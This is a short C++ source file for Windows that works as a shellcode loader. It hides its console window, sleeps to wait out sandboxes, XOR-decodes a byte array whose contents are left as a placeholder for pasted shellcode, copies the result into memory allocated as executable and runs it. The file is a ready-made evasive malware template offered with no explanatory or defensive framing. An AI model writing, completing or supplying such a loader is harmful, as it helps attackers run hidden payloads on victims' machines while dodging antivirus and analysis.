#include <windows.h>
#include <iostream>
#include<unistd.h>
int main(int argc, char **argv) {

ShowWindow(GetConsoleWindow(), SW_HIDE);
sleep(50);
char b[] = { Paste the XORED SHELL CODE };

char c[sizeof b];

for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}

void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

memcpy(exec, c, sizeof c);

((void(*)())exec)();

}
